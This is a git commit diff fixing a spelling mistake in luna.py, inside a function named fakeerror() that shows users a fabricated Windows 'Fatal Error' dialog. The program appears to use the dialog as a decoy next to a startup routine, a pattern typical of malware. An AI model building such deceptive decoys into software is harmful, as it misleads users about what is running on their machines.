abf5dfe4995e6ad72b85f47a7ca158eedcbae9f1
LinuxSushi <85527745+LinuxSushi@users.noreply.github.com>
2022-12-29 13:29:25 -0500

    Fixed embarrassing spelling mistake in luna.py
    Changed "occured" to "occurred"

--- luna.py
+++ luna.py
@@ -92,7 +92,7 @@ def configcheck(list):
 
 
 def fakeerror():
-    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while importing modules.', 'Fatal Error', 0)
+    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
 
 
 def startup():
